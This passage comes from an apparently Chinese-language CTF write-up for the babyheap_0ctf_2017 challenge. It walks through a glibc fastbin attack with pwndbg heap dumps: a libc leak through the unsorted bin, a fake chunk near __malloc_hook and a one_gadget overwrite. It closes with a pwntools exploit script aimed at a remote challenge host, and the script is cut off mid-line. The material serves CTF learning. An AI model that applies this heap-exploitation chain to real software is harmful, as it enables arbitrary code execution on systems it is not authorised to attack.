class="line">6</span><br></pre></td><td class="code"><pre><span class="line">allocate(10)#chunk0</span><br><span class="line">allocate(10)#chunk1</span><br><span class="line">allocate(10)#chunk2</span><br><span class="line">allocate(10)#chunk3</span><br><span class="line">allocate(80)#chunk4</span><br><span class="line">free(1)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx  </span><br><span class="line">0x5579684280000x557968428000:0x00000000000000000x0000000000000021 &lt;=chunk0</span><br><span class="line">0x557968428010:0x00000000000000000x0000000000000000</span><br><span class="line">0x557968428020:0x00000000000000000x0000000000000021 &lt;=chunk1</span><br><span class="line">0x557968428030:0x00000000000000000x0000000000000000</span><br><span class="line">0x557968428040:0x00000000000000000x0000000000000021 &lt;=chunk2</span><br><span class="line">0x557968428050:0x00000000000000000x0000000000000000</span><br><span class="line">0x557968428060:0x00000000000000000x0000000000000021 &lt;=chunk3</span><br><span class="line">0x557968428070:0x00000000000000000x0000000000000000</span><br><span class="line">0x557968428080:0x00000000000000000x0000000000000061 &lt;=chunk4</span><br><span class="line">0x557968428090:0x00000000000000000x0000000000000000</span><br><span class="line">0x5579684280a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5579684280b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5579684280c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5579684280d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x5579684280e0:0x00000000000000000x0000000000020f21</span><br><span class="line">0x5579684280f0:0x00000000000000000x0000000000000000</span><br><span class="line">pwndbg&gt; x/32gx &amp;main_arena</span><br><span class="line">0x7f063731bb20 &lt;main_arena&gt;:0x00000000000000000x0000557968428020</span><br><span class="line">0x7f063731bb30 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f063731bb40 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f063731bb50 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f063731bb60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f063731bb70 &lt;main_arena+80&gt;:0x00000000000000000x00005579684280e0</span><br><span class="line">0x7f063731bb80 &lt;main_arena+96&gt;:0x00000000000000000x00007f063731bb78</span><br><span class="line">0x7f063731bb90 &lt;main_arena+112&gt;:0x00007f063731bb780x00007f063731bb88</span><br><span class="line">0x7f063731bba0 &lt;main_arena+128&gt;:0x00007f063731bb880x00007f063731bb98</span><br><span class="line">0x7f063731bbb0 &lt;main_arena+144&gt;:0x00007f063731bb980x00007f063731bba8</span><br><span class="line">0x7f063731bbc0 &lt;main_arena+160&gt;:0x00007f063731bba80x00007f063731bbb8</span><br><span class="line">0x7f063731bbd0 &lt;main_arena+176&gt;:0x00007f063731bbb80x00007f063731bbc8</span><br><span class="line">0x7f063731bbe0 &lt;main_arena+192&gt;:0x00007f063731bbc80x00007f063731bbd8</span><br><span class="line">0x7f063731bbf0 &lt;main_arena+208&gt;:0x00007f063731bbd80x00007f063731bbe8</span><br><span class="line">0x7f063731bc00 &lt;main_arena+224&gt;:0x00007f063731bbe80x00007f063731bbf8</span><br><span class="line">0x7f063731bc10 &lt;main_arena+240&gt;:0x00007f063731bbf80x00007f063731bc08</span><br></pre></td></tr></table></figure><p>可以看到释放的fast chunk被放到了fast bin中，fast bin为单链结构，如果再释放一个free(2)，那么会插入到fast bin的头部，释放的第二个chunk的fd会被设置成第一个chunk的地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx &amp;main_arena</span><br><span class="line">0x7f8ff509db20 &lt;main_arena&gt;:0x00000000000000000x000055d82f950040</span><br><span class="line">0x7f8ff509db30 &lt;main_arena+16&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f8ff509db40 &lt;main_arena+32&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f8ff509db50 &lt;main_arena+48&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f8ff509db60 &lt;main_arena+64&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f8ff509db70 &lt;main_arena+80&gt;:0x00000000000000000x000055d82f9500e0</span><br><span class="line">0x7f8ff509db80 &lt;main_arena+96&gt;:0x00000000000000000x00007f8ff509db78</span><br><span class="line">0x7f8ff509db90 &lt;main_arena+112&gt;:0x00007f8ff509db780x00007f8ff509db88</span><br><span class="line">0x7f8ff509dba0 &lt;main_arena+128&gt;:0x00007f8ff509db880x00007f8ff509db98</span><br><span class="line">0x7f8ff509dbb0 &lt;main_arena+144&gt;:0x00007f8ff509db980x00007f8ff509dba8</span><br><span class="line">0x7f8ff509dbc0 &lt;main_arena+160&gt;:0x00007f8ff509dba80x00007f8ff509dbb8</span><br><span class="line">0x7f8ff509dbd0 &lt;main_arena+176&gt;:0x00007f8ff509dbb80x00007f8ff509dbc8</span><br><span class="line">0x7f8ff509dbe0 &lt;main_arena+192&gt;:0x00007f8ff509dbc80x00007f8ff509dbd8</span><br><span class="line">0x7f8ff509dbf0 &lt;main_arena+208&gt;:0x00007f8ff509dbd80x00007f8ff509dbe8</span><br><span class="line">0x7f8ff509dc00 &lt;main_arena+224&gt;:0x00007f8ff509dbe80x00007f8ff509dbf8</span><br><span class="line">0x7f8ff509dc10 &lt;main_arena+240&gt;:0x00007f8ff509dbf80x00007f8ff509dc08</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">bin</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x55d82f950040</span> —▸ <span class="number">0x55d82f950020</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line"><span class="built_in">all</span>: <span class="number">0x0</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; heap</span><br><span class="line"><span class="number">0x55d82f950000</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55d82f950020</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55d82f950040</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x55d82f950020</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x21</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55d82f950060</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">33</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x61</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55d82f950080</span> FASTBIN &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">97</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="number">0x55d82f9500e0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">134945</span>, </span><br><span class="line">  fd = <span class="number">0x0</span>, </span><br><span class="line">  bk = <span class="number">0x0</span>, </span><br><span class="line">  fd_nextsize = <span class="number">0x0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这时使用fill覆盖fast bin头部(即chunk2)的fd的值，将其改为small chunk的地址，这相当于small bin已经被free在fast bin中了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)<span class="comment">#chunk2</span></span><br><span class="line">payload += p8(<span class="number">0x80</span>)<span class="comment">#地址低位</span></span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br></pre></td></tr></table></figure><p>然后：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)<span class="comment">#chunk4_size</span></span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br></pre></td></tr></table></figure><p>这时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32gx 0x557ac06f3000</span><br><span class="line">0x557ac06f3000:0x00000000000000000x0000000000000021 &lt;=chunk0</span><br><span class="line">0x557ac06f3010:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f3020:0x00000000000000000x0000000000000021 &lt;=chunk1</span><br><span class="line">0x557ac06f3030:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f3040:0x00000000000000000x0000000000000021 &lt;=chunk2</span><br><span class="line">0x557ac06f3050:0x0000557ac06f30800x0000000000000000</span><br><span class="line">0x557ac06f3060:0x00000000000000000x0000000000000021 &lt;=chunk3</span><br><span class="line">0x557ac06f3070:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f3080:0x00000000000000000x0000000000000021 &lt;=chunk4</span><br><span class="line">0x557ac06f3090:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f30a0:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f30b0:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f30c0:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f30d0:0x00000000000000000x0000000000000000</span><br><span class="line">0x557ac06f30e0:0x00000000000000000x0000000000020f21</span><br><span class="line">0x557ac06f30f0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><p>接下来要malloc回chunk4，但是malloc fastbin有检查，chunksize必须和fastbin_index匹配。</p><p>所以覆盖chunk4的size为fastbin大小</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x10</span>)allocate(<span class="number">0x10</span>)payload = p64(<span class="number">0</span>) * 3payload += p64(<span class="number">0x91</span>)fill(<span class="number">3</span>,payload)allocate(<span class="number">0x80</span>)free(<span class="number">4</span>)libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>].strip().ljust(<span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>))-<span class="number">0x3c4b78</span></span><br></pre></td></tr></table></figure><blockquote><p>  ​        unsortbin 有一个特性，就是如果 usortbin 只有一个 bin ，它的 fd 和 bk 指针会指向同一个地址(unsorted bin 链表的头部），这个地址为 main_arena + 0x58 ，而且 main_arena 又相对 libc 固定偏移 0x3c4b20 ，所以得到这个fd的值，然后减去0x58再减去main_arena相对于libc的固定偏移，即得到libc的基地址。所以我们需要把 chunk 改成大于 fastbin 的大小，这样 free 后能进入 unsortbin 让我们能够泄露 libc 基址。<br>    我们的目标是覆盖 __malloc_hook 函数，这样我们调用 malloc 时就相当于调用我们写入的内容</p><p>  ​        <strong>malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写</strong> malloc_hook 来 getshell。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x400x7f12e66c5ae0 &lt;_IO_wide_data_0+288&gt;:0x00000000000000000x00000000000000000x7f12e66c5af0 &lt;_IO_wide_data_0+304&gt;:0x00007f12e66c42600x00000000000000000x7f12e66c5b00 &lt;__memalign_hook&gt;:0x00007f12e6386ea00x00007f12e6386a700x7f12e66c5b10 &lt;__malloc_hook&gt;:0x00000000000000000x00000000000000000x7f12e66c5b20 &lt;main_arena&gt;:0x00000000000000000x0000557ac06f30400x7f12e66c5b30 &lt;main_arena+16&gt;:0x00000000000000000x00000000000000000x7f12e66c5b40 &lt;main_arena+32&gt;:0x00000000000000000x00000000000000000x7f12e66c5b50 &lt;main_arena+48&gt;:0x00000000000000000x00000000000000000x7f12e66c5b60 &lt;main_arena+64&gt;:0x00000000000000000x00000000000000000x7f12e66c5b70 &lt;main_arena+80&gt;:0x00000000000000000x0000557ac06f30e00x7f12e66c5b80 &lt;main_arena+96&gt;:0x00000000000000000x00007f12e66c5b780x7f12e66c5b90 &lt;main_arena+112&gt;:0x00007f12e66c5b780x00007f12e66c5b880x7f12e66c5ba0 &lt;main_arena+128&gt;:0x00007f12e66c5b880x00007f12e66c5b980x7f12e66c5bb0 &lt;main_arena+144&gt;:0x00007f12e66c5b980x00007f12e66c5ba80x7f12e66c5bc0 &lt;main_arena+160&gt;:0x00007f12e66c5ba80x00007f12e66c5bb80x7f12e66c5bd0 &lt;main_arena+176&gt;:0x00007f12e66c5bb80x00007f12e66c5bc8</span><br></pre></td></tr></table></figure><p>同样的，这里我们也要绕过 malloc 的安全检查，chunksize 必须与 fastbin_index 相对应，初看 __malloc_hook 附近没有合适的 chunksize，这里需要巧妙的偏移一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32xg (long long)(&amp;main_arena)-0x40+0xd</span><br><span class="line">0x7f12e66c5aed &lt;_IO_wide_data_0+301&gt;:0x12e66c42600000000x000000000000007f &lt;=fake chunk</span><br><span class="line">0x7f12e66c5afd:0x12e6386ea00000000x12e6386a7000007f</span><br><span class="line">0x7f12e66c5b0d &lt;__realloc_hook+5&gt;:0x000000000000007f0x0000000000000000</span><br><span class="line">0x7f12e66c5b1d:0x00000000000000000x7ac06f3040000000</span><br><span class="line">0x7f12e66c5b2d &lt;main_arena+13&gt;:0x00000000000000550x0000000000000000</span><br><span class="line">0x7f12e66c5b3d &lt;main_arena+29&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f12e66c5b4d &lt;main_arena+45&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f12e66c5b5d &lt;main_arena+61&gt;:0x00000000000000000x0000000000000000</span><br><span class="line">0x7f12e66c5b6d &lt;main_arena+77&gt;:0x00000000000000000x7ac06f30e0000000</span><br><span class="line">0x7f12e66c5b7d &lt;main_arena+93&gt;:0x00000000000000550x12e66c5b78000000</span><br><span class="line">0x7f12e66c5b8d &lt;main_arena+109&gt;:0x12e66c5b7800007f0x12e66c5b8800007f</span><br><span class="line">0x7f12e66c5b9d &lt;main_arena+125&gt;:0x12e66c5b8800007f0x12e66c5b9800007f</span><br><span class="line">0x7f12e66c5bad &lt;main_arena+141&gt;:0x12e66c5b9800007f0x12e66c5ba800007f</span><br><span class="line">0x7f12e66c5bbd &lt;main_arena+157&gt;:0x12e66c5ba800007f0x12e66c5bb800007f</span><br><span class="line">0x7f12e66c5bcd &lt;main_arena+173&gt;:0x12e66c5bb800007f0x12e66c5bc800007f</span><br><span class="line">0x7f12e66c5bdd &lt;main_arena+189&gt;:0x12e66c5bc800007f0x12e66c5bd800007f</span><br></pre></td></tr></table></figure><p>在0x7f12e66c5aed，这样就可以构造出一个index为5的fastbin，这样就可以改写__malloc_hook了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(libc_base+<span class="number">0x3c4aed</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br></pre></td></tr></table></figure><p> 首先把 chunk 4 malloc 回来，这次 malloc 的大小在 fastbin 之内，然后把 chunk 4 的内容改为我们下一个要构造块的地址（chunk 4 已经被 free 掉，所以无法用 fill(4) 写入，由于我们刚刚把 chunk 2 的 fd 指针改为 chunk 4 的地址，所以第一次 malloc(0x10) 的时候是分配的原来 chunk 2 的块给 index 1，第二次 malloc(0x10) 的时候就会分配 chunk 4 的块给 index 2，也就是说 index 2 与 index 4 的内容都是 chunk 4）</p><p>这里介绍一个神奇的工具 one gadget，只用一个 gadget 地址就可以成功调用 execve(“/bin/sh”)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gwt@ubuntu:~/Desktop$ one_gadget libc-x64-2.23.so </span><br><span class="line">[OneGadget] </span><br><span class="line">Checking for new versions of OneGadget            </span><br><span class="line">To disable this functionality, do            </span><br><span class="line">$ echo never &gt; /home/gwt/.cache/one_gadget/update[OneGadget] </span><br><span class="line">A newer version of OneGadget is available (1.6.2 --&gt; 1.7.4).            </span><br><span class="line">Update with: $ gem update one_gadget &amp;&amp; gem cleanup one_gadget0x45216</span><br><span class="line">execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  rax == NULL0x4526a</span><br><span class="line">execve(&quot;/bin/sh&quot;, rsp+0x30, environ)constraints:  [rsp+0x30] == NULL0xf02a4</span><br><span class="line">execve(&quot;/bin/sh&quot;, rsp+0x50, environ)constraints:  [rsp+0x50] == NULL0xf1147</span><br><span class="line">execve(&quot;/bin/sh&quot;, rsp+0x70, environ)constraints:  [rsp+0x70] == NULL</span><br></pre></td></tr></table></figure><p>在 __malloc_hook 地址处写入 one_gadget ，这样再次 allocate 就可以调用 one_gadget 拿 shell</p><p>EXP:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;DEBUG&#x27;</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./babyheap_0ctf_2017&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>, <span class="number">28982</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc-x64-2.23.so&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span>(<span class="params">size</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)<span class="comment">#allocate</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Size: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span>(<span class="params">index,content</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Command: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Index: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Size: &#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Content: &#x27;</span>)</span><br><span class="line">io.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)<span class="comment">#free</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span>(<span class="params">index</span>):</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;Command: &quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index: &quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">payload += p8(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">0</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line">allocate(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0x91</span>)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">3</span>,payload)</span><br><span class="line">allocate(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content: \n&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(io.recv(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">malloc_hook = libc_base + libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">payload = p64(malloc_hook - <span class="number">35</span>)</span><br><span class="line">fill(<span class="number">2</span>, payload)</span><br><span class="line"> </span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line">allocate(<span class="number">0x60</span>)</span><br><span class="line"> </span><br><span class="line">payload = p8(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload += p64(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">fill(<span class="number">6</span>, payload)</span><br><span class="line"> </span><br><span class="line">allocate(<span 